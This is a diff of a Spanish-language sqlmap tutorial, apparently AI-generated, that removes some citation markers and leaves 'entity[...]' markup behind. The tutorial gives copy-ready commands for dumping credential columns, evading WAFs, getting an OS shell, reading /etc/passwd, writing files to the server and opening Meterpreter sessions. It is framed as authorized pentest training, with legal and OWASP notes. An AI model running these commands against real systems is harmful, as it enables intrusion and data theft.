@@ -131,26 +131,26 @@ sqlmap -r req.txt -p name --batch --dbs
 
 | Flag | Para qué sirve | Ejemplo listo para copiar/pegar |
 |---|---|---|
-| `-u` | URL objetivo | `sqlmap -u "http://target/vuln.php?id=1" --dbs` citeturn1view0 |
-| `--data` | Fuerza POST con cuerpo y testea parámetros | `sqlmap -u "http://target/login.php" --data="u=a&p=b" --dbs` citeturn1view0 |
+| `-u` | URL objetivo | `sqlmap -u "http://target/vuln.php?id=1" --dbs` 
+| `--data` | Fuerza POST con cuerpo y testea parámetros | `sqlmap -u "http://target/login.php" --data="u=a&p=b" --dbs` 
 | `-r` | Cargar request HTTP cruda desde fichero | `sqlmap -r req.txt --dbs` citeturn3view1turn1view0 |
-| `--cookie` | Enviar cookies; útil para auth y para testear vector en cookie | `sqlmap -u "http://t/v.php?id=1" --cookie="PHPSESSID=..." --dbs` citeturn1view0 |
-| `--headers` | Añadir headers extra (uno por línea) | `sqlmap -u "http://t/v.php?id=1" --headers=$'X-Test: 1\nX-Forwarded-For: 127.0.0.1'` citeturn1view0 |
+| `--cookie` | Enviar cookies; útil para auth y para testear vector en cookie | `sqlmap -u "http://t/v.php?id=1" --cookie="PHPSESSID=..." --dbs`
+| `--headers` | Añadir headers extra (uno por línea) | `sqlmap -u "http://t/v.php?id=1" --headers=$'X-Test: 1\nX-Forwarded-For: 127.0.0.1'` 
 | `--random-agent` | User-Agent aleatorio (evitar bloqueos simples) | `sqlmap -r req.txt --random-agent --batch` citeturn1view0 |
-| `--level` | Profundidad de tests y “superficie” (incluye más vectores: cookies/headers) | `sqlmap -r req.txt --level=5 --batch` citeturn1view0 |
+| `--level` | Profundidad de tests y “superficie” (incluye más vectores: cookies/headers) | `sqlmap -r req.txt --level=5 --batch` 
 | `--risk` | Riesgo de payloads (más agresivos; puede ser peligroso) | `sqlmap -r req.txt --risk=3 --batch` citeturn1view0 |
-| `--tamper` | Aplicar scripts de ofuscación/transformación | `sqlmap -r req.txt --tamper="between,randomcase" --batch` citeturn1view0 |
-| `--threads` | Concurrencia HTTP (acelera blind/enum; cuidado con estabilidad) | `sqlmap -r req.txt --threads=5 --batch` citeturn3view1 |
+| `--tamper` | Aplicar scripts de ofuscación/transformación | `sqlmap -r req.txt --tamper="between,randomcase" --batch`
+| `--threads` | Concurrencia HTTP (acelera blind/enum; cuidado con estabilidad) | `sqlmap -r req.txt --threads=5 --batch` 
 | `-p` | Elegir parámetro(s) testeables | `sqlmap -r req.txt -p name --dbs --batch` citeturn3view1 |
 | `--technique` | Limitar técnicas (p.ej. solo Error+Stacked) | `sqlmap -r req.txt --technique=ES --batch` citeturn1view0 |
-| `--auth-type/--auth-cred` | Autenticación HTTP Basic/Digest/NTLM (si aplica) | `sqlmap -u "http://t/v.php?id=1" --auth-type Basic --auth-cred "u:p"` citeturn2view5turn1view0 |
-| `--forms / --crawl` | Descubrir inputs (formularios/enlaces) | `sqlmap -u "http://t/" --forms --crawl=2 --batch` citeturn5view2turn5view0 |
+| `--auth-type/--auth-cred` | Autenticación HTTP Basic/Digest/NTLM (si aplica) | `sqlmap -u "http://t/v.php?id=1" --auth-type Basic --auth-cred "u:p"`
+| `--forms / --crawl` | Descubrir inputs (formularios/enlaces) | `sqlmap -u "http://t/" --forms --crawl=2 --batch` 
 
 Nota de seguridad operativa: `--risk=3` puede introducir payloads `OR` que, en ciertos contextos (por ejemplo en un `UPDATE` vulnerable), podrían afectar múltiples filas. La guía oficial explica la motivación de `--risk` precisamente para que el usuario controle tests potencialmente peligrosos. citeturn1view0
 
 ## Enumeración y extracción con ejemplos prácticos
 
-La sección de “Enumeration” de la guía oficial detalla switches para enumerar información del DBMS, estructura y datos; también advierte que “recuperar todo” con `--all` no suele ser recomendable por volumen de requests/datos. citeturn1view0
+La sección de “Enumeration” de la guía oficial detalla switches para enumerar información del DBMS, estructura y datos; también advierte que “recuperar todo” con `--all` no suele ser recomendable por volumen de requests/datos. 
 
 ### Enumeración mínima recomendada
 
@@ -171,11 +171,11 @@ sqlmap -r req.txt -D register -T users --columns --batch
 sqlmap -r req.txt -D register -T users --dump --batch
 ```
 
-Estos flags (`--dbs`, `--tables`, `--columns`, `--dump`) forman el flujo estándar de enumeración que aparece tanto en documentación y ejemplos comunitarios en español como en guías rápidas. citeturn1view0turn0search3turn0search34
+Estos flags (`--dbs`, `--tables`, `--columns`, `--dump`) forman el flujo estándar de enumeración que aparece tanto en documentación y ejemplos comunitarios en español como en guías rápidas. 
 
 ### Dump selectivo y control del formato
 
-Para no volcar “todo”, prioriza columnas concretas con `-C` y usa `--dump-format` si te interesa HTML/SQLite además de CSV (CSV es el default documentado). citeturn5view0turn1view0
+Para no volcar “todo”, prioriza columnas concretas con `-C` y usa `--dump-format` si te interesa HTML/SQLite además de CSV (CSV es el default documentado). 
 
 ```bash
 sqlmap -r req.txt -D register -T users -C username,passwd --dump --dump-format=CSV --batch
@@ -183,13 +183,13 @@ sqlmap -r req.txt -D register -T users -C username,passwd --dump --dump-format=C
 
 ### Consejos para interpretar resultados y siguientes acciones
 
-Una vez extraes credenciales/datos, *el trabajo real* es convertirlo en impacto verificable (con autorización): iniciar sesión, acceder a paneles, verificar permisos y registrar evidencias. El entity["organization","OWASP","nonprofit web security"] WSTG remarca que una explotación exitosa de SQLi puede permitir acceso o manipulación no autorizada de datos, por lo que la validación de impacto y el registro de evidencias es parte de una prueba seria. citeturn0search2
+Una vez extraes credenciales/datos, *el trabajo real* es convertirlo en impacto verificable (con autorización): iniciar sesión, acceder a paneles, verificar permisos y registrar evidencias. El entity["organization","OWASP","nonprofit web security"] WSTG remarca que una explotación exitosa de SQLi puede permitir acceso o manipulación no autorizada de datos, por lo que la validación de impacto y el registro de evidencias es parte de una prueba seria. 
 
-Si el campo parece un hash o binario, sqlmap contempla modos de manejo (por ejemplo `--binary-fields` para recuperar correctamente valores binarios y dejarlos listos para procesarlos con herramientas externas). citeturn5view2turn1view0
+Si el campo parece un hash o binario, sqlmap contempla modos de manejo (por ejemplo `--binary-fields` para recuperar correctamente valores binarios y dejarlos listos para procesarlos con herramientas externas).
 
 ## Post-explotación con sqlmap, automatización y resolución de problemas
 
-sqlmap incluye funcionalidades de “takeover” del sistema subyacente cuando el DBMS y los permisos lo permiten: ejecución de comandos (`--os-cmd`, `--os-shell`), acceso a ficheros (`--file-read`, `--file-write/--file-dest`) y canales OOB más complejos (`--os-pwn`, etc.). La guía oficial detalla requisitos y ejemplos, y especifica que estas capacidades dependen de DBMS soportados (MySQL/PostgreSQL/MSSQL) y privilegios del usuario de sesión. citeturn2view1turn2view2turn2view4
+sqlmap incluye funcionalidades de “takeover” del sistema subyacente cuando el DBMS y los permisos lo permiten: ejecución de comandos (`--os-cmd`, `--os-shell`), acceso a ficheros (`--file-read`, `--file-write/--file-dest`) y canales OOB más complejos (`--os-pwn`, etc.). La guía oficial detalla requisitos y ejemplos, y especifica que estas capacidades dependen de DBMS soportados (MySQL/PostgreSQL/MSSQL) y privilegios del usuario de sesión. 
 
 ### Ejemplos reproducibles de post-explotación
 
@@ -205,7 +205,7 @@ sqlmap -r req.txt --os-cmd="id" --batch
 sqlmap -r req.txt --os-shell --batch
 ```
 
-La documentación describe que `--os-shell` simula una shell con historial/autocompletado similar a `--sql-shell`. citeturn2view0turn2view1
+La documentación describe que `--os-shell` simula una shell con historial/autocompletado similar a `--sql-shell`. 
 
 **Leer un fichero del servidor (si hay privilegios):**
 
@@ -219,7 +219,7 @@ sqlmap -r req.txt --file-read="/etc/passwd" --batch
 sqlmap -r req.txt --file-write="./local.bin" --file-dest="/tmp/local.bin" --batch
 ```
 
-sqlmap documenta explícitamente `--file-read` y `--file-write/--file-dest` como mecanismos de acceso al filesystem subyacente cuando el DBMS/privilegios lo permiten. citeturn2view2turn2view3
+sqlmap documenta explícitamente `--file-read` y `--file-write/--file-dest` como mecanismos de acceso al filesystem subyacente cuando el DBMS/privilegios lo permiten. 
 
 **Canal OOB / sesión tipo Meterpreter/VNC (existente en sqlmap):**
 
@@ -227,22 +227,22 @@ sqlmap documenta explícitamente `--file-read` y `--file-write/--file-dest` como
 sqlmap -r req.txt --os-pwn --batch
 ```
 
-La guía oficial describe `--os-pwn` como parte de un conjunto de técnicas que pueden apoyarse en Metasploit para generar/ejecutar payloads, y detalla varios métodos (UDFs, ejecución, SMB relay, etc.). citeturn2view4turn1view0
+La guía oficial describe `--os-pwn` como parte de un conjunto de técnicas que pueden apoyarse en Metasploit para generar/ejecutar payloads, y detalla varios métodos (UDFs, ejecución, SMB relay, etc.).
 
 ### Manejo de redirecciones 302 y POST reenviado
 
-En escenarios reales (login, flujos multi-página), es común que el servidor responda con 302. sqlmap puede preguntarte si quieres seguir la redirección y, si viene de un POST, si quieres reenviar el POST a la nueva ubicación (exactamente el prompt que has visto). La interpretación práctica de ese prompt se documenta en discusiones técnicas y Q&A: significa que el flujo “A → B” está redirigiendo, y tú decides si reenvías el mismo cuerpo POST a B. citeturn4search0turn4search1
+En escenarios reales (login, flujos multi-página), es común que el servidor responda con 302. sqlmap puede preguntarte si quieres seguir la redirección y, si viene de un POST, si quieres reenviar el POST a la nueva ubicación (exactamente el prompt que has visto). La interpretación práctica de ese prompt se documenta en discusiones técnicas y Q&A: significa que el flujo “A → B” está redirigiendo, y tú decides si reenvías el mismo cuerpo POST a B. 
 
 Para automatizar o controlar redirecciones:
 
-- `--ignore-redirects` existe para ignorar intentos de redirección. citeturn3view2turn1view0  
-- `--batch` evita interacción, pero si necesitas respuestas específicas para redirects (seguir sí/no, reenviar POST sí/no), `--answers` puede fijarlas. citeturn5view2turn1view0  
+- `--ignore-redirects` existe para ignorar intentos de redirección.  
+- `--batch` evita interacción, pero si necesitas respuestas específicas para redirects (seguir sí/no, reenviar POST sí/no), `--answers` puede fijarlas. 
 
 ### Interpretación de logs, sesiones y ruta de salida
 
-sqlmap guarda sesiones y resultados en un directorio de salida; la guía oficial explica que por defecto usa un subdirectorio `output` y permite cambiarlo con `--output-dir`. citeturn5view1turn5view0
+sqlmap guarda sesiones y resultados en un directorio de salida; la guía oficial explica que por defecto usa un subdirectorio `output` y permite cambiarlo con `--output-dir`. 
 
-En ejecuciones reales verás mensajes del tipo “fetched data logged to text files under ...”, y en entornos distintos puede variar el path: en GNU/Linux suele colgar de un directorio del usuario, y en Windows se han reportado rutas tipo `AppData\Local\sqlmap\output\...`. citeturn4search3turn4search14
+En ejecuciones reales verás mensajes del tipo “fetched data logged to text files under ...”, y en entornos distintos puede variar el path: en GNU/Linux suele colgar de un directorio del usuario, y en Windows se han reportado rutas tipo `AppData\Local\sqlmap\output\...`. 
 
 Comandos prácticos sobre sesiones:
 
@@ -254,28 +254,28 @@ sqlmap -r req.txt --flush-session --batch
 sqlmap -r req.txt --fresh-queries --batch
 ```
 
-Estas opciones están documentadas en la guía oficial (`--flush-session`, `--fresh-queries`). citeturn5view0turn1view0
+Estas opciones están documentadas en la guía oficial (`--flush-session`, `--fresh-queries`). 
 
 ### Errores comunes y cómo resolverlos
 
 **“no parameter(s) found for testing”**  
-Significa que no hay parámetros que testear en los datos proporcionados. Soluciones típicas: usar `-r`, aportar `--data`, seleccionar con `-p`, o permitir que sqlmap descubra inputs con `--forms` / `--crawl`. citeturn3view1turn5view0turn5view2
+Significa que no hay parámetros que testear en los datos proporcionados. Soluciones típicas: usar `-r`, aportar `--data`, seleccionar con `-p`, o permitir que sqlmap descubra inputs con `--forms` / `--crawl`. 
 
 **“Broken pipe” / timeouts / inestabilidad de conexión**  
-En pruebas *blind* o con muchas requests, los timeouts y cortes pueden ocurrir; sqlmap expone controles como `--timeout` y `--retries` para gestionar esperas y reintentos, además de `--keep-alive` para conexiones persistentes si aplica. citeturn3view1turn5view1
+En pruebas *blind* o con muchas requests, los timeouts y cortes pueden ocurrir; sqlmap expone controles como `--timeout` y `--retries` para gestionar esperas y reintentos, además de `--keep-alive` para conexiones persistentes si aplica. 
 
 **WAF/IPS y bloqueos por payloads “sospechosos”**  
-La guía oficial describe que sqlmap hace un test heurístico de WAF/IPS enviando un payload deliberadamente sospechoso, y ofrece `--skip-waf` para omitir esa heurística si lo necesitas. Para evadir validaciones débiles o WAFs, documenta `--tamper` y permite listar scripts con `--list-tampers`. citeturn1view0
+La guía oficial describe que sqlmap hace un test heurístico de WAF/IPS enviando un payload deliberadamente sospechoso, y ofrece `--skip-waf` para omitir esa heurística si lo necesitas. Para evadir validaciones débiles o WAFs, documenta `--tamper` y permite listar scripts con `--list-tampers`. 
 
 **Contenido dinámico que rompe la comparación True/False**  
-Si la página cambia aun sin inyección, sqlmap permite afinar la comparación con `--string`, `--not-string`, `--regexp` o incluso `--code`. Eso es crítico para boolean-based blind. citeturn1view0turn0search6
+Si la página cambia aun sin inyección, sqlmap permite afinar la comparación con `--string`, `--not-string`, `--regexp` o incluso `--code`. Eso es crítico para boolean-based blind. 
 
 ### Buenas prácticas de seguridad y legalidad
 
-- sqlmap incluye un “legal disclaimer” explícito: su uso contra objetivos sin consentimiento es ilegal, y la responsabilidad recae en el usuario final. En un entorno de formación/lab, documenta siempre el alcance y permisos. citeturn1view0turn4search36  
-- Desde la perspectiva defensiva, entity["organization","OWASP","nonprofit web security"] provee guías para probar y prevenir SQLi (validación, parametrización, etc.). Incluir mitigaciones en el informe final es parte del trabajo de calidad. citeturn0search2turn0search37  
-- Tras takeover/FS/OS, sqlmap recomienda limpiar artefactos temporales (tablas/UDFs), y documenta `--cleanup` para intentarlo. citeturn5view0turn1view0  
+- sqlmap incluye un “legal disclaimer” explícito: su uso contra objetivos sin consentimiento es ilegal, y la responsabilidad recae en el usuario final. En un entorno de formación/lab, documenta siempre el alcance y permisos.  
+- Desde la perspectiva defensiva, entity["organization","OWASP","nonprofit web security"] provee guías para probar y prevenir SQLi (validación, parametrización, etc.). Incluir mitigaciones en el informe final es parte del trabajo de calidad. 
+- Tras takeover/FS/OS, sqlmap recomienda limpiar artefactos temporales (tablas/UDFs), y documenta `--cleanup` para intentarlo. 
 
 ### Referencias priorizadas para ampliar
 
-Las fuentes más sólidas para “aprender de verdad” y verificar flags/comportamiento son: documentación oficial de sqlmap (web y wiki de uso), guías de testing de entity["organization","OWASP","nonprofit web security"] (WSTG) y documentación de entity["company","PortSwigger","burp suite vendor"] sobre pruebas de SQLi. Para apoyo en español, existen *cheat sheets* y guías prácticas (calidad variable) que pueden servir como recordatorio, pero deben contrastarse con la documentación oficial. citeturn4search36turn1view0turn0search2turn0search1turn0search3turn4search21turn0search34turn0search7turn0search26
+Las fuentes más sólidas para “aprender de verdad” y verificar flags/comportamiento son: documentación oficial de sqlmap (web y wiki de uso), guías de testing de entity["organization","OWASP","nonprofit web security"] (WSTG) y documentación de entity["company","PortSwigger","burp suite vendor"] sobre pruebas de SQLi. Para apoyo en español, existen *cheat sheets* y guías prácticas (calidad variable) que pueden servir como recordatorio, pero deben contrastarse con la documentación oficial. 
